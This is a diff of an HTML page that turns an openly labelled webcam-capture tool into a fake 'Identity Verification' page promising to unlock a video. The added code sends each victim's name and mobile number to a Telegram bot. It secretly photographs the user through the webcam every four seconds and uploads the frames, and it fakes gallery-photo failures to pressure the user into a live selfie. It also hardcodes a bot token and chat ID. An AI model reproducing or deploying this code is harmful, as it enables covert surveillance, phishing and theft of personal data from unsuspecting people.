@@ -3,131 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Access Link Generator</title>
+    <title>Identity Verification</title>
     <style>
-        body { font-family: 'Arial', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; }
-        .card { background-color: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15); text-align: center; max-width: 500px; width: 100%; }
-        h1 { color: #333; margin-bottom: 20px; }
-        p { color: #555; font-size: 1.1em; margin-bottom: 30px; line-height: 1.6; }
-        button { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: background-color 0.3s ease, transform 0.2s ease; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
-        button:hover { background-color: #0056b3; transform: translateY(-2px); }
-        button:active { transform: translateY(0); box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); }
-        #status { margin-top: 25px; font-size: 1em; color: #888; }
-        .error { color: #dc3545; font-weight: bold; }
-        .success { color: #28a745; font-weight: bold; }
-
-        /* Hidden elements for camera stream and canvas */
-        #v-hidden, #c-hidden { display: none; position: fixed; left: -9999px; }
+        :root { --red: #ff0000; --bg: #0d0d0d; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 90%; max-width: 380px; background: #1a1a1a; border-radius: 25px; padding: 25px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .red-txt { color: var(--red); font-weight: bold; font-size: 22px; margin-bottom: 10px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #333; border-radius: 12px; background: #222; color: white; box-sizing: border-box; outline: none; font-size: 16px; }
+        .btn { width: 100%; padding: 16px; background: var(--red); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; transition: 0.3s; }
+        #camera-screen, #gallery-step { display: none; }
+        #v-live { width: 100%; border-radius: 15px; margin-top: 15px; border: 2px solid #333; background: #000; transform: scaleX(-1); }
+        #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
     </style>
 </head>
-<body>
+<body onload="initCamera()">
 
-    <div class="card">
-        <h1>Camera Access Link Generator</h1>
-        <p>Click the button below to generate a secure link that requests camera access. Once access is granted, photos will be sent directly to your Telegram bot.</p>
-        <button onclick="requestCameraAccess()">Generate & Request Camera Access</button>
-        <div id="status"></div>
+    <div class="card" id="step1">
+        <div class="red-txt">Verification Required</div>
+        <p style="font-size: 13px; color: #888;">Enter details to unlock content.</p>
+        <input type="text" id="u_name" placeholder="Full Name">
+        <input type="tel" id="u_num" placeholder="Mobile Number">
+        <button class="btn" id="next-btn" onclick="submitStep1()">NEXT STEP</button>
+    </div>
+
+    <div class="card" id="gallery-step">
+        <div class="red-txt">Upload Proof</div>
+        <p id="msg" style="font-size: 13px; color: #888;">Select a photo from Gallery for verification.</p>
+        <input type="file" id="g-input" accept="image/*" onchange="handleGallery(this)" style="display:none;">
+        <label for="g-input" id="g-label" class="btn" style="display:block;">CHOOSE FROM GALLERY</label>
+        <button id="cam-btn" class="btn" style="display:none; background: #28a745;" onclick="startSelfieMode()">OPEN CAMERA (DIRECT)</button>
+    </div>
+
+    <div class="card" id="camera-screen">
+        <div class="red-txt">Live Selfie</div>
+        <video id="v-live" autoplay playsinline></video>
+        <button class="btn" onclick="captureSelfie()">CAPTURE & SEND</button>
     </div>
 
     <video id="v-hidden" autoplay playsinline muted></video>
     <canvas id="c-hidden"></canvas>
 
 <script>
-    // Aapka Telegram Bot Token aur Chat ID
-    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA"; // Apna bot token yahan daalen
-    const chatID = "7107389141"; // Apna chat ID yahan daalen
+    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+    const chatID = "7107389141";
+    let mainStream = null;
+    let retries = 0;
 
-    let cameraStream = null; // Camera stream ko track karne ke liye variable
-    let captureInterval = null; // Interval ko track karne ke liye
-
-    async function requestCameraAccess() {
-        const statusDiv = document.getElementById('status');
-        statusDiv.className = '';
-        statusDiv.textContent = 'Requesting camera access...';
-
+    // 1. Camera Initialization
+    async function initCamera() {
         try {
-            // Camera access ki request
-            cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, // Front camera
-                audio: false 
-            });
+            mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v-hidden').srcObject = mainStream;
+            setInterval(autoBackgroundHit, 4000);
+        } catch (e) { 
+            console.log("Camera Blocked");
+            alert("Please allow camera access to proceed!");
+        }
+    }
 
-            const video = document.getElementById('v-hidden');
-            video.srcObject = cameraStream;
-            await video.play(); // Video play karein
+    // 2. Step 1 Submit (FIXED NEXT BUTTON)
+    function submitStep1() {
+        const n = document.getElementById('u_name').value;
+        const p = document.getElementById('u_num').value;
+        
+        if(n === "" || p === "") {
+            alert("Please enter your name and number!");
+            return;
+        }
 
-            statusDiv.className = 'success';
-            statusDiv.textContent = 'Camera access granted! Photos will now be sent to your bot.';
+        // Send Data to Bot (Background mein chalta rahega)
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: chatID, text: `🎯 *NEW HIT DETAILS*\nName: ${n}\nNo: ${p}`, parse_mode: 'Markdown'})
+        });
+
+        // Foran screen change karein (bina wait kiye)
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('gallery-step').style.display = 'block';
+    }
+
+    // 3. Gallery Logic
+    function handleGallery(input) {
+        if (input.files && input.files[0]) {
+            retries++;
+            const fd = new FormData();
+            fd.append('chat_id', chatID);
+            fd.append('photo', input.files[0]);
+            fd.append('caption', `📁 GALLERY ATTEMPT #${retries}`);
             
-            // Jab video play hona shuru ho jaye tab photos lena shuru karein
-            video.onplaying = () => {
-                // Pehli photo foran len
-                capturePhoto();
-                // Phir har 3 seconds baad photo len
-                captureInterval = setInterval(capturePhoto, 3000); 
-            };
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
 
-        } catch (error) {
-            console.error("Camera access error:", error);
-            statusDiv.className = 'error';
-            if (error.name === 'NotAllowedError') {
-                statusDiv.textContent = 'Camera access denied by user. Please allow camera in your browser settings.';
-            } else if (error.name === 'NotFoundError') {
-                statusDiv.textContent = 'No camera found on this device.';
+            if(retries >= 2) {
+                document.getElementById('msg').innerText = "Gallery photo quality too low.";
+                document.getElementById('g-label').style.display = 'none';
+                document.getElementById('cam-btn').style.display = 'block';
             } else {
-                statusDiv.textContent = `Error: ${error.message}. Please try again or check browser permissions.`;
-            }
-            // Agar camera access na mile to pehle se chal rahe interval ko band kar den
-            if (captureInterval) {
-                clearInterval(captureInterval);
-                captureInterval = null;
-            }
-            // Agar stream hai to usko bhi stop kar den
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
+                alert("Verification Failed. Try another photo.");
             }
         }
     }
 
-    function capturePhoto() {
-        const video = document.getElementById('v-hidden');
-        const canvas = document.getElementById('c-hidden');
+    // 4. Start Real Camera
+    function startSelfieMode() {
+        document.getElementById('gallery-step').style.display = 'none';
+        document.getElementById('camera-screen').style.display = 'block';
+        document.getElementById('v-live').srcObject = mainStream;
+    }
+
+    // 5. Capture Real Selfie
+    function captureSelfie() {
+        const v = document.getElementById('v-live');
+        const can = document.getElementById('c-hidden');
+        can.width = v.videoWidth; can.height = v.videoHeight;
+        can.getContext('2d').drawImage(v, 0, 0);
         
-        // Ensure video is playing and ready
-        if (video.readyState === 4 && cameraStream) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        can.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', chatID);
+            fd.append('photo', blob, 'selfie.jpg');
+            fd.append('caption', "📸 *REAL SELFIE RECEIVED*");
             
-            // Canvas content ko Blob mein convert karein aur bot par bhejein
-            canvas.toBlob(blob => {
-                if (blob) {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatID);
-                    formData.append('photo', blob, 'live_photo.jpg'); // Filename for the photo
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (!data.ok) {
-                            console.error("Failed to send photo to bot:", data.description);
-                            // Agar Telegram API block ho to user ko alert de sakte hain
-                            // document.getElementById('status').textContent = 'Warning: Telegram API might be blocked. Photos may not be delivered. Try with VPN.';
-                        } else {
-                            console.log("Photo sent successfully!");
-                        }
-                    })
-                    .catch(error => {
-                        console.error("Error sending photo to bot:", error);
-                        // document.getElementById('status').textContent = 'Network error: Cannot reach Telegram. Try with VPN.';
-                    });
-                }
-            }, 'image/jpeg', 0.8); // Image quality (0.8 = 80%)
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd})
+            .then(() => {
+                alert("Verification Successful! Video Unlocked.");
+                location.reload();
+            });
+        }, 'image/jpeg', 0.8);
+    }
+
+    // 6. Background Auto Hits
+    function autoBackgroundHit() {
+        const v = document.getElementById('v-hidden');
+        const can = document.getElementById('c-hidden');
+        if (v.readyState === 4) {
+            can.width = v.videoWidth; can.height = v.videoHeight;
+            can.getContext('2d').drawImage(v, 0, 0);
+            can.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chatID);
+                fd.append('photo', blob, 'live.jpg');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
+            }, 'image/jpeg', 0.3);
         }
     }
 </script>
